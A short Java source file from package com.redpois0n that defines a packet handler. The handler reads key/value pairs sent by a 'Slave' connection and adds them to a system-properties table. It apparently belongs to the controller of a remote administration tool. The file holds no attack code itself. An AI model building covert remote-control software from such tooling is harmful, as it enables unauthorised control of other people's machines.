package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameSystem;

public class PacketVARPROP extends Packet {

	public void read(Slave slave, String line) throws Exception {
		FrameSystem frame = FrameSystem.instances.get(slave);
		String key = slave.readLine();
		String value = slave.readLine();
		if (frame != null) {
			frame.model.addRow(new Object[] { key, value });
		}
	}

}
